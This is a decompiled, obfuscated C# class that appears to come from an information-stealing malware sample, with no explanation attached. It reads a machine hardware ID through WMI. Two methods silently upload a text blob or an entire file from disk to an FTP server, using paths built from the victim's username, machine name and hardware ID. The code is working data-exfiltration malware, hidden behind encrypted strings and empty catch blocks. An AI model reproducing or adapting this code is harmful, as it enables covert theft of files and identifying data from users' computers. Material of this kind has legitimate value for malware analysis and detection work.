using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace frgoWklvEOSV;

internal sealed class GyWbmViNanxKl
{
	[NonSerialized]
	internal static GetString _0092;

	public static string nFyAFAYBITHjh()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b4: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(_0092(107403227));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(_0092(107403238)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = _0092(107403189);
			ManagementObject val3 = new ManagementObject(_0092(107403216) + text2 + _0092(107403175));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(_0092(107403170)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? _0092(107388731) : text;
		}
	}

	public static void ATmjNWylGeJO(string GGfZJTIeZfqSyf = "URL", string EmtIKAFvwf = "USERNAME", string BxrieFCDHWF = "ACCESO", string EfhtMYGgxswewP = "")
	{
		try
		{
			string text = nFyAFAYBITHjh();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(GGfZJTIeZfqSyf + _0092(107404365) + Environment.UserName + _0092(107404320) + Environment.MachineName + _0092(107404331) + text + _0092(107404326));
			ftpWebRequest.Method = _0092(107402633);
			ftpWebRequest.Credentials = new NetworkCredential(EmtIKAFvwf, BxrieFCDHWF);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(EfhtMYGgxswewP);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void DGdOiIgzOMW(string EsxiMLIAfaIHpW = "URL", string AwAIdzsyQmcXX = "USERNAME", string nvCXoOTWldXjB = "ACCESO", string jHSdWWdzYFXSmJ = "")
	{
		try
		{
			string text = nFyAFAYBITHjh();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(EsxiMLIAfaIHpW + _0092(107404365) + Environment.UserName + _0092(107404320) + Environment.MachineName + _0092(107404331) + text + _0092(107404331) + Path.GetFileName(jHSdWWdzYFXSmJ));
			ftpWebRequest.Method = _0092(107402633);
			ftpWebRequest.Credentials = new NetworkCredential(AwAIdzsyQmcXX, nvCXoOTWldXjB);
			byte[] array = File.ReadAllBytes(jHSdWWdzYFXSmJ);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static GyWbmViNanxKl()
	{
		Strings.CreateGetStringDelegate(typeof(GyWbmViNanxKl));
	}
}
